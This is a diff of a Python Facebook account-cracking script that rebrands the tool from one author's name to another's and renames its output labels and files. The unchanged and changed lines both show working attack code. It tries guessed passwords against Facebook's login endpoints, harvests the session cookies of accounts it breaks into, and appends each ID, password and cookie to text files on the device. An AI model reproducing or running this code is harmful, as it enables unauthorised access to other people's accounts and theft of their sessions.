@@ -90,24 +90,22 @@ def result(OKs,cps):
         input("\033[1;97m Press Enter To Back Main Menu ")
         menu()
 #<----[banner]------>
-logo=("""\033[1;97m
-          ########    #######   ########  
-          ##     ##  ##     ##  ##     ## 
-          ##     ##  ##     ##  ##     ## 
-          ##     ##  ##     ##  ##     ## 
-          ##     ##  ##     ##  ##     ## 
-          ##     ##  ##     ##  ##     ## 
-          ########    #######   ########  
-\33[1;37m--------------------------------------------------
- Owner      :  Hammad Khan
- Facebook   :  Mughal Zada
- Github     :  https://github.com/MughalZada245
-\33[1;37m--------------------------------------------------""")
+logo=(f"""
+\033[1;97m  ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+\033[1;97m  ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+\033[1;97m  ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█                                               
+===============================================
+  Auther        :  RJ SHANTO
+  Facebook      :  SH AN TO 
+  TOOLS         :  PRIVATE
+  Version       :  V-1
+  WhatsApp      :  013108682**
+=============================================== \033[1;97m""")
 def clear():
 	os.system('clear')
 	print(logo)
 def linex():
-	print('\33[1;37m--------------------------------------------------')
+	print('\033[1;97m--------------------------------------------------')
 #<----[main_menu]------>
 def menu():
 	clear()
@@ -266,14 +264,14 @@ class main_crack():
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
-                    print(f'\r\r\x1b[1;92m [MUGHAL-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
+                    print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                     oks.append(rid)
-                    open('/sdcard/MUGHAL-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f'\r\r\x1b[1;91m [MUGHAL-CP] {rid} | {ps}\033[1;97m')
+                     ##print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
                      cps.append(rid)
-                     open('/sdcard/MUGHAL-CP.txt','a').write(rid+'|'+ps+'\n')
+                     open('/sdcard/SHANTO-CP.txt','a').write(rid+'|'+ps+'\n')
                 else:
                     continue 
             loop+=1
@@ -320,14 +318,14 @@ class main_crack():
                 q = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
-                    print(f'\r\r\x1b[1;92m [MUGHAL-OK] {rid} | {ps}\033[1;97m')
+                    print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps}\033[1;97m')
                     oks.append(rid)
-                    open('/sdcard/MUGHAL-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f'\r\r\x1b[1;91m[MUGHAL-CP] {rid} | {ps}\033[1;97m')
+                     ##print(f'\r\r\x1b[1;91m[SHANTO-CP] {rid} | {ps}\033[1;97m')
                      cps.append(rid)
-                     open('/sdcard/MUGHAL-CP.txt','a').write(rid+'|'+ps+'\n')
+                     open('/sdcard/SHANTO-CP.txt','a').write(rid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -390,14 +388,14 @@ class main_crack():
                 q = session.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
                 if 'session_key' in q:
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
-                    print(f'\r\r\x1b[1;92m [MUGHAL-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
+                    print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps} \n \033[1;37mCookie : {cookie}\033[1;97m')
                     oks.append(rid)
-                    open('/sdcard/MUGHAL-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     print(f'\r\r\x1b[1;91m [MUGHAL-CP] {rid} | {ps}\033[1;97m')
+                     ##print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
                      cps.append(rid)
-                     open('/sdcard/MUGHAL-CP.txt','a').write(rid+'|'+ps+'\n')
+                     open('/sdcard/SHANTO-CP.txt','a').write(rid+'|'+ps+'\n')
                 else:
                     continue
             loop+=1
@@ -1942,15 +1940,15 @@ def fcrack(uid,pwx,tl):
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
-				print('\033[1;92m [MUGHAL-OK] '+cid+' | '+ps+'\033[1;32m')
-				open('MUGHAL.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				print('\033[1;92m [SHANTO-OK] '+cid+' | '+ps+'\033[1;32m')
+				open('SHANTO.RNDM-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
 			elif 'checkpoint' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
-				print('\33[1;31m [MUGHAL-CP] '+cid+' | '+ps+'\33[0;97m')
-				open('MUGHAL.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
+				##print('\33[1;31m [SHANTO-CP] '+cid+' | '+ps+'\33[0;97m')
+				open('SHANTO.RNDM-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
 			else:
